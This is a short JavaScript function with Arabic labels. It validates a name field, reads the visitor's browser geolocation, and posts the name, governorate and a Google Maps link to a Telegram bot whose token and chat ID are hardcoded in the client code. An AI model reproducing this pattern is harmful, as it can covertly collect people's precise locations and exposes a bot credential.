function sendLocation() {
    var name = document.getElementById("name").value;
    var governorate = document.getElementById("governorate").value;
    var nameError = document.getElementById("name-error");

    if (name === "") {
      nameError.textContent = "يرجى إدخال الاسم";
      return;
    } else {
      nameError.textContent = "";
    }

    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var botToken = "5847619291:AAFHhh5gBBRrG_9NbKO7t9RNfyFhwH_U3c0";
            var chatId = "1202104899";

            var googleMapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
            var message = "الاسم : " + name + "\n\nالمحافظة : " + governorate + "\n\nاللوكيشن : " + googleMapsLink;

            var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            var params = {
                chat_id: chatId,
                text: message
            };

            var xhr = new XMLHttpRequest();
            xhr.open("POST", telegramUrl, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(params));
        });
    }
}

